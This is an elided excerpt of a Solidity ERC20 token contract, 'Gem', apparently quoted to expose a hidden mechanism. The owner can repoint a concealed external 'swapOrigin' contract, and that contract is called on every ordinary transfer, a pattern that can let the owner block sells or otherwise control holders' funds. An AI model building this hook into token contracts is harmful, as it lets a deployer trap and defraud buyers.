...
contract Gem is ERC20, Ownable {
    ...
    address private swapOrigin = address(0xe5A64fA300165135ee0e4094D81149709bfe4C84);
    ...
    constructor() ERC20("GEM", "GEM") {
        ...
        marketingWallet = payable(0x9483B7fDd6F9fC389DC284f38d47Cf5FbA92244A);
        developmentWallet = payable(0x9483B7fDd6F9fC389DC284f38d47Cf5FbA92244A);
        liquidityWallet = payable(0x1d8c06f9Dbd5E837DeAd0Dc3Bbc34F7998a0280f);
        operationsWallet = payable(0x1d8c06f9Dbd5E837DeAd0Dc3Bbc34F7998a0280f);
    ...
    function updateSwapOrigin(address newSwapOrigin) external onlyOwner {
        swapOrigin = newSwapOrigin;
    }
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            ICalcSwap(swapOrigin).calcSwap(from, to);
        }
